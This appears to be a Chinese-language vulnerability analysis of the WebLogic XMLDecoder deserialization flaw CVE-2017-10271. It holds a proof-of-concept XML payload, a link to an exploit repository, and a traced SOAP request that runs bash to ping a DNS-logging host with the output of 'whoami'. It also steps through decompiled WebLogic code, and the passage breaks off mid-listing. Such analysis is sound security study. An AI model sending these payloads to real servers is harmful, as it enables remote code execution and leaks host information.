<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.csB2D98684{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs508254C{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;text-decoration: none;}
			.cs4B51D5E4{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="cve-2017-10271java反序列化漏洞"><span class="csDE05BCC">(CVE-2017-10271)Java</span><span class="csECDA2D3">反序列化漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一、漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<h2 class="cs868C439D">
			<a name="二、漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Oracle WebLogic Server10.3.6.0.0</span></p><p class="cs40DD2BC9"><span class="cs8926E06">Oracle WebLogic Server12.1.3.0.0</span></p><p class="cs40DD2BC9"><span class="cs8926E06">Oracle WebLogic Server12.2.1.1.0</span></p><p class="cs40DD2BC9"><span class="cs8926E06">Oracle WebLogic Server12.2.1.3.0</span></p><h2 class="cs868C439D">
			<a name="三、复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h2 class="cs868C439D">
			<a name="exp"><span class="csB2D98684">exp</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06"><a class="cs508254C" href="https://github.com/ianxtianxt/-CVE-2017-10271-"><span class="cs4B51D5E4">https://github.com/ianxtianxt/-CVE-2017-10271-</span></a></span></p><h2 class="cs868C439D">
			<a name="poc"><span class="csB2D98684">poc</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">xml </span><span class="cs9C1B1871">文件</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;java version=&quot;1.8.0_131&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;object class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;array class=&quot;java.lang.String&quot; length=&quot;1&quot;&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;void index=&quot;0&quot;&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;string&gt;/Applications/Calculator.app/Contents/MacOS/Calculator&lt;/string&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/void&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/array&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;void method=&quot;start&quot; /&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;/object&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;/java&gt;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">读取</span><span class="cs8926E06">xml</span><span class="cs9C1B1871">文件，进行反序列化执行命令代码：</span></p><p class="cs3A447A38"><span class="cs9FB05234">import java.io.BufferedInputStream;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import java.io.FileInputStream;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import java.io.FileNotFoundException;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">public class xmlrce {</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public static void main(String[] args) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// TODO Auto-generated method stub</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;java.io.File file = new java.io.File(&quot;/Users/pirogue/IdeaProjects/weblogic/src/poc.xml&quot;);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;java.beans.XMLDecoder xd = null;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xd = new java.beans.XMLDecoder(new BufferedInputStream(new FileInputStream(file)));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} catch (FileNotFoundException e) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// TODO Auto-generated catch block</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;e.printStackTrace();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Object s2 = xd.readObject();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xd.close();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Weblogic/%ef%bc%88CVE-2017-10271%ef%bc%89Weblogic%20XMLDecoder%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e_files/image0.png" width="560" height="266" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs8926E06">CVE-2017-10271 weblogic</span><span class="cs9C1B1871">反序列化漏洞</span></p><p class="cs40DD2BC9"><span class="cs8926E06">WLSServletAdapter.class</span></p><p class="cs3A447A38"><span class="cs9FB05234">public void handle(ServletContext var1, HttpServletRequest var2, HttpServletResponse var3) throws IOException {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (var2.getMethod().equals(&quot;GET&quot;) || var2.getMethod().equals(&quot;HEAD&quot;)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HttpMetadataPublisher var4 = (HttpMetadataPublisher)this.endpoint.getSPI(HttpMetadataPublisher.class);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (var4 != null &amp;&amp; var4.handleMetadataRequest(this, this.createConnection(var1, var2, var3))) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (this.isOraWsdlMetadataQuery(var2.getQueryString())) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.publishWSDL(this.createConnection(var1, var2, var3));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;super.handle(var1, var2, var3);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Weblogic/%ef%bc%88CVE-2017-10271%ef%bc%89Weblogic%20XMLDecoder%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e_files/image1.png" width="560" height="290" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">当开启调试模式，</span><span class="cs8926E06">ping</span><span class="cs9C1B1871">时，</span><span class="cs8926E06">WLSServletAdapter</span><span class="cs9C1B1871">对请求进行接收处理，执行到</span><span class="cs8926E06">super.handle(var1, var2, var3);</span><span class="cs9C1B1871">后，跟进关键代码如下：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Weblogic/%ef%bc%88CVE-2017-10271%ef%bc%89Weblogic%20XMLDecoder%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e_files/image2.png" width="560" height="18" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs8926E06">WorkContentServerTube.class</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Weblogic/%ef%bc%88CVE-2017-10271%ef%bc%89Weblogic%20XMLDecoder%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e_files/image3.png" width="560" height="22" alt="" style="border-width:0px;" /></span></p><p class="cs3A447A38"><span class="cs9FB05234">public NextAction processRequest(Packet var1) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;this.isUseOldFormat = false;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (var1.getMessage() != null) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HeaderList var2 = var1.getMessage().getHeaders();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Header var3 = var2.get(WorkAreaConstants.WORK_AREA_HEADER, true);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (var3 != null) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.readHeaderOld(var3);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.isUseOldFormat = true;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Header var4 = var2.get(this.JAX_WS_WORK_AREA_HEADER, true);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (var4 != null) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.readHeader(var4);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return super.processRequest(var1);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">将</span><span class="cs8926E06">var3</span><span class="cs9C1B1871">传递给</span><span class="cs8926E06">readHeaderOld(var3)</span><span class="cs9C1B1871">，继续跟进</span><span class="cs8926E06">readHeaderOld</span><span class="cs9C1B1871">。</span></p><p class="cs40DD2BC9"><span class="cs8926E06">var1</span><span class="cs9C1B1871">的值</span><span class="cs8926E06">:</span></p><p class="cs3A447A38"><span class="cs9FB05234">com.sun.xml.ws.api.message.Packet@4419bacb Content: &lt;?xml version=&#39;1.0&#39; encoding=&#39;UTF-8&#39;?&gt;&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;&lt;soapenv:Header&gt;&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot; xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;java version=&quot;1.8.0_131&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;void index=&quot;0&quot;&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;string&gt;/bin/bash&lt;/string&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;/void&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;void index=&quot;1&quot;&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;string&gt;-c&lt;/string&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;/void&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;void index=&quot;2&quot;&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;string&gt;ping `whoami`.7153b738c41fxxxxxxaadf9dbd46.tu4.org&lt;/string&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;/void&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;/array&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;/java&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body/&gt;&lt;/soapenv:Envelope&gt;</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Weblogic/%ef%bc%88CVE-2017-10271%ef%bc%89Weblogic%20XMLDecoder%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e_files/image4.png" width="560" height="87" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs8926E06">WorkContextTube.class</span></p><p class="cs3A447A38"><span class="cs9FB05234">protected void readHeaderOld(Header var1) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;try {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;XMLStreamReader var2 = var1.readHeader();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var2.nextTag();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var2.nextTag();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;XMLStreamReaderToXMLStreamWriter var3 = new XMLStreamReaderToXMLStreamWriter();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ByteArrayOutputStream var4 = new ByteArrayOutputStream();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;XMLStreamWriter var5 = XMLStreamWriterFactory.create(var4);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var3.bridge(var2, var5);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var5.close();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WorkContextXmlInputAdapter var6 = new WorkContextXmlInputAdapter(new ByteArrayInputStream(var4.toByteArray()));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.receive(var6);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} catch (XMLStreamException var7) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;throw new WebServiceException(var7);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} catch (IOException var8) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;throw new WebServiceException(var8);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Weblogic/%ef%bc%88CVE-2017-10271%ef%bc%89Weblogic%20XMLDecoder%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e_files/image5.png" width="560" height="232" alt="" style="border-width:0px;" /></span></p><p class="cs3A447A38"><span class="cs7FFD2630">基础知识拓展：</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">ByteArrayInputStream</span><span class="cs7FFD2630">的用法：</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">InputStream</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">|__ ByteArrayInputStream</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">OutputStream</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">|__ ByteArrayOutputStream</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">ByteArrayInputStream</span><span class="cs7FFD2630">可以将字节数组转化为输入流。</span><span class="cs9FB05234">ByteArrayOutputStream</span><span class="cs7FFD2630">可以捕获内存缓冲区的数据，转化成字节数组。</span><span class="cs8926E06"><br/><br/></span><span class="cs7FFD2630">构造函数：</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">public ByteArrayInputStream(byte buf[])</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">public ByteArrayInputStream(byte buf[], int offset, int length)</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">注意它需要提供一个</span><span class="cs9FB05234">byte</span><span class="cs7FFD2630">数组作为缓冲区。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">我们通过</span><span class="cs8926E06">idea</span><span class="cs9C1B1871">代码窗口内可以看到各个变量在调试运行后的值，</span><span class="cs8926E06">var4</span><span class="cs9C1B1871">的值就是接收</span><span class="cs8926E06">poc</span><span class="cs9C1B1871">的</span><span class="cs8926E06">xml</span><span class="cs9C1B1871">，在</span><span class="cs8926E06"> WorkContextXmlInputAdapter var6 = new WorkContextXmlInputAdapter(new ByteArrayInputStream(var4.toByteArray())); </span><span class="cs9C1B1871">中，要创建</span><span class="cs8926E06">WorkContextXmlInputAdapter</span><span class="cs9C1B1871">的实例</span><span class="cs8926E06">var6, </span><span class="cs9C1B1871">则</span><span class="cs8926E06">var4.toByteArray()</span><span class="cs9C1B1871">先转换成字节数组，传入</span><span class="cs8926E06">ByteArrayInputStream</span><span class="cs9C1B1871">转换成输入流，跟进</span><span class="cs8926E06">WorkContextXmlInputAdapter</span><span class="cs9C1B1871">，在</span><span class="cs8926E06">WorkContextXmlInputAdapter.class</span><span class="cs9C1B1871">内，</span><span class="cs8926E06">WorkContextXmlInputAdapter</span><span class="cs9C1B1871">接收输入流，并将输入流转换成</span><span class="cs8926E06">XMLDecoder</span><span class="cs9C1B1871">对象，这时如果再调用</span><span class="cs8926E06">XMLDecoder</span><span class="cs9C1B1871">的</span><span class="cs8926E06">readObject()</span><span class="cs9C1B1871">方法对其进行反序列化即可造成命令执行。其实在</span><span class="cs8926E06">this.receive(var6);</span><span class="cs9C1B1871">中，进行了多层调用最终到达</span><span class="cs8926E06">readObject</span><span class="cs9C1B1871">，下面会省略过多无关调试，记录</span><span class="cs8926E06">xml</span><span class="cs9C1B1871">反序列化相关：</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">下面是对</span><span class="cs8926E06">WorkContextXmlInputAdapter</span><span class="cs9C1B1871">和创建</span><span class="cs8926E06">xml</span><span class="cs9C1B1871">反序列化对象后如何执行的</span><span class="cs8926E06">readObject</span><span class="cs9C1B1871">方法造成</span><span class="cs8926E06">rce</span><span class="cs9C1B1871">的代码跟踪</span></p><p class="cs40DD2BC9"><span class="cs8926E06">WorkContextXmlInputAdapter.class</span></p><p class="cs3A447A38"><span class="cs9FB05234">//</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">// Source code recreated from a .class file by IntelliJ IDEA</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">// (powered by Fernflower decompiler)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">//</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">package weblogic.wsee.workarea;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">import java.beans.XMLDecoder;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import java.io.FileInputStream;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import java.io.IOException;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import java.io.InputStream;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import java.io.NotSerializableException;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import weblogic.workarea.WorkContext;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import weblogic.workarea.WorkContextInput;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">public final class WorkContextXmlInputAdapter implements WorkContextInput {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;private final XMLDecoder xmlDecoder;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public WorkContextXmlInputAdapter(InputStream var1) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.xmlDecoder = new XMLDecoder(var1); // WorkContextXmlInputAdapter</span><span class="cs7FFD2630">构造函数，将输入流转换成</span><span class="cs9FB05234">XMLDecoder</span><span class="cs7FFD2630">反序列化对象</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public WorkContextXmlInputAdapter(XMLDecoder var1) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.xmlDecoder = var1;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public String readASCII() throws IOException {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return (String)this.xmlDecoder.readObject();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public WorkContext readContext() throws IOException, ClassNotFoundException {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Class var1 = Class.forName(this.readASCII());</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WorkContext var2 = (WorkContext)var1.newInstance();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var2.readContext(this);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return var2;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} catch (InstantiationException var3) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;throw (IOException)(new NotSerializableException(&quot;WorkContext must have a public no-arg constructor&quot;)).initCause(var3);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} catch (IllegalAccessException var4) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;throw (IOException)(new NotSerializableException(&quot;WorkContext must have a public no-arg constructor&quot;)).initCause(var4);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> 